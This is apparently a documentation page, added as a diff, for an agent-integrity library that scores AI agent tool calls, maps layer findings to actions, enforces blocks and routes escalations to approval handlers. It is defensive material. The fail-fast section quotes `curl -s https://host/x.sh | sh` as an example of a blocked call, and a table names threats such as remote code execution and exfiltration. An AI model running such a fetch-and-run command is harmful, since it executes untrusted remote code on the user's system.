@@ -1,0 +1,171 @@
+---
+title: "Scores and actions"
+description: "How the composite score is weighted, which actions each layer can recommend, what enforcement does with them, how approvals fail closed, and how drift, degradation and recovery move the score."
+---
+
+Every evaluation returns an `IntegrityScore`: a composite between 0.0 and 1.0, four property scores, the per-layer results, and one recommended action. Measuring and enforcing are separate. The score and action are always computed and recorded; whether the action stops anything depends on `enforce`.
+
+## The composite score
+
+The composite is a weighted sum of the four property scores, rounded to four decimals:
+
+```
+composite = 0.35 × adversarial_coherence
+          + 0.20 × environmental_portability
+          + 0.30 × verifiable_assurance
+          + 0.15 × recovery_integrity
+```
+
+Each property comes from one layer's score ([how layers map to properties](/concepts/how-it-works#integrity-properties)). Change the weights with `PropertyWeights`. They must sum to 1.0 (within 0.001) or the constructor raises `ValueError`.
+
+```python
+from agentegrity import AgentegrityClient, PropertyWeights
+
+weights = PropertyWeights(
+    adversarial_coherence=0.40,
+    environmental_portability=0.15,
+    verifiable_assurance=0.25,
+    recovery_integrity=0.20,
+)
+client = AgentegrityClient(weights=weights)
+```
+
+`IntegrityEvaluator(layers=..., weights=...)` accepts the same object. An `IntegrityScore` also carries:
+
+| Field | Meaning |
+|---|---|
+| `properties` | `PropertyScores` with the four values above |
+| `layer_results` | One `LayerResult` per layer that ran, each with `score`, `passed`, `action`, `details`, `latency_ms` |
+| `passed` | True when every layer that ran passed |
+| `action` | The most severe action across layers |
+| `confidence` | Lower when layers were skipped (fail-fast) or returned no details |
+| `total_latency_ms` | Wall time for the evaluation |
+
+A low composite does not by itself block anything. Actions decide what happens; the composite is the measurement you trend, alert on, or pass to `IntegrityMonitor(threshold=...)`.
+
+## Actions
+
+Layers recommend one of four actions, ranked by severity. The score's `action` is the most severe one any layer returned.
+
+| Action | Rank | Produced by (default layers) |
+|---|---|---|
+| `pass` | 0 | No layer found a problem |
+| `alert` | 1 | Adversarial: a threat of severity 0.50 to 0.89, or coherence below `coherence_threshold`. Cortical: drift above tolerance (including above twice the tolerance by default), low memory integrity or reasoning consistency. Governance: a `CONDITIONAL` rule. Recovery: sustained degradation, peer cascade, or a recovery score under 0.5 |
+| `escalate` | 2 | Governance: any `REQUIRE_APPROVAL` rule (GOV-001 to GOV-005, or a rule whose condition raised). Cortical: an instruction overriding declared goals. Recovery: a broken attestation chain |
+| `block` | 3 | Adversarial: any threat of severity 0.90 or more with `block_on_critical=True` (for example `remote_code_exec`, `log_tamper`, high-severity exfiltration or tool-poisoning patterns). Governance: a `DENY` rule. Cortical: drift above twice the tolerance with `block_on_drift=True` |
+
+Two other words show up nearby and are not score actions:
+
+- `allow` is a governance `PolicyDecision` (a rule that did not trigger) and the verdict the coding-agent hooks return for `pass` and `alert`. The hooks map `escalate` to `ask` on Claude Code and `deny` on Codex, and `block` to `deny`; see [Claude Code](/integrations/claude-code) and [Codex](/integrations/codex).
+- `log` is one of the four `ViolationAction` values (`log`, `alert`, `block`, `escalate`) on `IntegrityMonitor(on_violation=...)`. It labels the `ViolationEvent` the monitor records when the composite drops below `threshold` or a layer fails. It does not change what `@monitor.guard` does.
+
+## Measure-only and enforce
+
+Adapters start measure-only (`enforce=False`). Every event is still evaluated, attested and exported, and `get_summary()["enforce_mode"]` is `False`.
+
+With `enforce=True`, the adapter acts on `pre_tool_use` results:
+
+- `block` always denies the tool call.
+- `escalate` denies unless an `approval_handler` approves it.
+- `alert` and `pass` let the call run.
+
+The deny reaches the framework in its own form: a `permissionDecision: deny` hook return on the Claude Agent SDK, `StopAgentRun` on Agno, `event.cancel_tool` on Strands, and so on. The Google ADK, AutoGen and Bedrock boto3 adapters observe after the fact, so under `enforce=True` they record the decision but cannot stop the call. The zero-config functions take the flag directly:
+
+```python
+from agentegrity.claude import hooks
+
+options = ClaudeAgentOptions(hooks=hooks(enforce=True))
+```
+
+The coding-agent hook plugins default to enforcing and offer an `alert` mode that records the verdict it would have returned.
+
+<Warning>
+Enforcement acts on every escalate source. With a declared topology of more than three members, GOV-004 escalates every evaluation, so an enforcing adapter without an approval handler denies every tool call in that team.
+</Warning>
+
+## Escalation and approval
+
+An `approval_handler` is called as `handler(profile, score, candidate_action)` when an enforced tool call escalates. `candidate_action` is `{"type": "tool_call", "tool_name": ..., "arguments": ...}`. The handler returns `True` to approve or `False` to deny, or an `ApprovalDecision`. If it raises, the call is denied.
+
+`ApprovalWorkflow` wraps a handler with a timeout. An unanswered request is denied unless you choose `timeout_action="allow"`, and a raising handler is denied.
+
+```python
+from claude_agent_sdk import ClaudeAgentOptions
+from agentegrity import AgentProfile, ApprovalDecision, ApprovalWorkflow
+from agentegrity.adapters.claude import ClaudeAdapter
+
+def ask_oncall(profile, score, candidate_action):
+    approved = page_oncall(candidate_action)  # your own paging or review UI
+    return ApprovalDecision(approved=approved, approver="oncall@example.com")
+
+adapter = ClaudeAdapter(
+    profile=AgentProfile.default(),
+    enforce=True,
+    approval_handler=ApprovalWorkflow(ask_oncall, approver="oncall", timeout=120),
+)
+options = ClaudeAgentOptions(hooks=adapter.create_hooks())
+```
+
+The zero-config `hooks()` / `instrument()` functions do not take an approval handler, so construct the adapter class as above. `ClaudeAdapter`, `LangChainAdapter`, `OpenAIAgentsAdapter`, `CrewAIAdapter` and `AgnoAdapter` accept `approval_handler=`. `BedrockAgentsAdapter` does not, so on the enforcing Strands path every escalation is denied. Every consulted approval is appended to the chain as a `DecisionRecord` with `decision_point="approval"` and a reasoning chain of `outcome`, `approver`, `timed_out`, `requested_at`, `resolved_at` and, when given, `reason`. It is signed when the adapter has a signing key, and `agentegrity report` lists these records in its approvals table.
+
+<Warning>
+`IntegrityMonitor(approval_handler=...)` treats the handler's return value as a boolean. An `ApprovalDecision` object is always truthy there, so pass a plain function that returns `True` or `False` to the monitor, and use `ApprovalWorkflow` with adapters.
+</Warning>
+
+## Drift
+
+The cortical layer compares the session's action distribution and tool-usage distribution against a learned baseline.
+
+| Setting | Default | Effect |
+|---|---|---|
+| `drift_tolerance` | 0.15 | Drift above it alerts |
+| `block_on_drift` | `False` | When `True`, drift above twice the tolerance blocks instead of alerting |
+| `min_drift_samples` | 20 | A dimension is not scored until both baseline and session have this many observations |
+| `metric` | `"js"` | `"wasserstein"` uses scipy (`[stats]` extra) and falls back to Jensen-Shannon with a warning when scipy is missing |
+| `baseline_store` | none | `InMemoryBaselineStore`, `FileBaselineStore`, `SqliteBaselineStore`, or your own |
+
+Drift past twice the tolerance alerts by default because a change in tool mix is a reason to review a session, and blocking on it would deny calls whenever an agent took on new work. Set `block_on_drift=True` on a `CorticalLayer` you construct yourself to restore blocking.
+
+The baseline is learned when an adapter closes. If the session ended without any `block` or `escalate`, its action and tool counts are folded into the baseline (`CorticalLayer.learn_session`), so each session is measured against earlier ones and an attack session never becomes the new normal. Without a `baseline_store` the baseline lives as long as the process. To keep it across runs, build the evaluator with a store and pass it to the adapter:
+
+```python
+from agentegrity import AgentProfile, IntegrityEvaluator
+from agentegrity.adapters.claude import ClaudeAdapter
+from agentegrity.layers import SqliteBaselineStore, default_layers
+
+evaluator = IntegrityEvaluator(
+    layers=default_layers(baseline_store=SqliteBaselineStore("baselines.db")),
+)
+adapter = ClaudeAdapter(profile=AgentProfile.default(), evaluator=evaluator)
+```
+
+In a declared multi-agent topology the baseline is keyed by agent and role, so a member that starts acting like a different role is measured against its own role's history.
+
+## Sustained degradation
+
+The recovery layer keeps the history of composite scores; adapters record every composite. Over the last `degradation_window` scores (default 10, and at least 3 are needed), it compares the average of the first half with the average of the second. A drop of `degradation_threshold` (default 0.15) or more sets `sustained_degradation` and the layer alerts. The degradation sub-score falls to `1 - 3 × drop`, floored at 0.
+
+```python
+from agentegrity.layers import RecoveryLayer
+
+recovery = RecoveryLayer(degradation_window=20, degradation_threshold=0.10)
+```
+
+Outside an adapter, call `recovery.record_score(score.composite)` after each evaluation yourself.
+
+## How scores recover
+
+Evidence affects the score for as long as it still describes the agent's state:
+
+| Evidence | How long it counts |
+|---|---|
+| Tool errors | Only errors from the last 10 tool calls (`TOOL_ERROR_WINDOW`). An old failure stops lowering the score; a burst of failures still alerts |
+| Injected content in tool outputs and the reasoning chain | Until `pre_compact`. Compaction removes it from the agent's context, so the adapter archives it in the event (`archived_tool_outputs`, `archived_chain`) and clears it |
+| Tool-call history and categories | The whole session. A sensitive read early in the session still makes a later external send escalate under GOV-005, and `ToolSequenceDetector` still sees the pair |
+| Composite history | The degradation window |
+
+Clearing content at compaction changes the score from then on. The attestation chain keeps every earlier score.
+
+## Fail-fast and partial scores
+
+`IntegrityEvaluator` stops at the first layer that returns `block` (`fail_fast=True`, the default). The skipped layers contribute no score: portability falls back to the lowest layer score that ran, assurance to the mean, and `recovery_integrity` is 0.0. A blocked `curl -s https://host/x.sh | sh` call, for example, produces a score from the adversarial layer alone with `confidence` 0.25, so its composite reflects one layer. Pass `fail_fast=False` to run every layer.
